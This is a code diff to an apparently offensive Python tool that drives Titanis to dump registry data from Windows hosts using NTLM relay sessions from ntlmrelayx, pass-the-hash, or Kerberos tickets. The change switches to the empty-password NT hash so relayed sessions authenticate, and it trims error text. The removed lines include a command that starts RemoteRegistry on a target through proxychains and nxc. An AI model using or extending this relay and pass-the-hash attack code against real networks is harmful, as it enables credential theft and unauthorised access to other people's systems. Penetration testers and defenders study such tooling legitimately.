@@ -296,10 +296,11 @@ def _auth_args(args):
     elif args.password:
         a += ['-Password', args.password]
     elif getattr(args, 'no_pass', False):
-        # Non-empty dummy — ntlmrelayx ignores the actual NTLM material and
-        # substitutes the pre-auth session; empty string risks a null/anonymous
-        # session request that the relay can't intercept.
-        a += ['-Password', 'x']
+        # Pass-the-hash with the empty-password NT hash as a dummy.
+        # PtH forces NTLM-only (no SPNEGO Kerberos negotiation), so ntlmrelayx
+        # sees a proper NTLM_AUTHENTICATE with username/domain filled in and can
+        # match the relay session.  ntlmrelayx ignores the actual hash value.
+        a += ['-NtlmHash', '31d6cfe0d16ae931b73c59d7e0c089c0']
     if args.kdc:           a += ['-Kdc',         args.kdc]
     if args.aes_key:       a += ['-AesKey',       args.aes_key]
     if args.tgt:           a += ['-Tgt',          args.tgt]
@@ -2049,25 +2050,14 @@ def dump_host(host, args, auth):
             except Exception: pass
 
         if _reg_auth_failed:
-            if getattr(args, 'no_pass', False):
-                msg = (f'[!] {host} — Reg returned no output (rc={_reg_fail_rc})\n'
-                       f'    Relay mode: likely causes:\n'
-                       f'      1. RemoteRegistry is stopped on target — start it:\n'
-                       f'         proxychains nxc smb {host} -u {args.username or "USER"} '
-                       f'-d {args.domain or "DOMAIN"} --no-pass -x "sc start RemoteRegistry"\n'
-                       f'      2. Relay session expired or not present for this host\n'
-                       f'      3. proxychains not routing .NET socket calls '
-                       f'(try proxychains4 instead of proxychains)\n'
-                       f'    Run with -v to see raw Titanis Reg output')
-            elif getattr(args, 'kerberos', False):
-                msg = (f'[!] {host} — authentication failed '
-                       f'(Reg returned no output, rc={_reg_fail_rc})\n'
-                       f'    Kerberos: ccache must have a cifs/ SPN — '
-                       f'getST.py -spn cifs/{host} ...')
+            if getattr(args, 'kerberos', False):
+                msg = (f'[!] {host} — authentication failed (rc={_reg_fail_rc})\n'
+                       f'    ccache must have a cifs/ SPN — '
+                       f'getST.py -spn cifs/{host} ...\n'
+                       f'    Run with -v to see raw Titanis output')
             else:
-                msg = (f'[!] {host} — authentication failed '
-                       f'(Reg returned no output, rc={_reg_fail_rc})\n'
-                       f'    Verify credentials and network access')
+                msg = (f'[!] {host} — authentication failed (rc={_reg_fail_rc})\n'
+                       f'    Run with -v to see raw Titanis output')
             print(msg, file=sys.stderr)
             return 'auth_failed', []
 
